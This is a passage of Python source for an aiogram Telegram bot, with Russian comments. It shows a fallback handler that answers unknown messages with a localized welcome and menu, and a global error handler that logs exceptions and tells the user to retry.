# ================= НЕИЗВЕСТНЫЕ СООБЩЕНИЯ (ВСЕГДА ПОСЛЕДНИМ!) =================

@router.message()
async def unknown_message(message: Message):
    user = await db.get_user(message.from_user.id)
    lang = user["language"]
    await message.answer(
        t(lang, "welcome"),
        reply_markup=main_menu_kb(lang, bool(user["is_admin"]))
    )


# ================= ГЛОБАЛЬНЫЙ ОБРАБОТЧИК ОШИБОК =================

@router.error()
async def global_error_handler(event: Exception, update: Update = None):
    """Ловит все необработанные ошибки. event — это исключение, update — апдейт."""
    print(f"[ERROR] {type(event).__name__}: {event}")
    try:
        if update is not None:
            if update.message:
                await update.message.answer(
                    "⚠️ Произошла небольшая ошибка. Попробуйте ещё раз или начните заново с /start"
                )
            elif update.callback_query:
                await update.callback_query.answer(
                    "⚠️ Произошла ошибка, попробуйте ещё раз", show_alert=True
                )
    except Exception:
        pass
    return True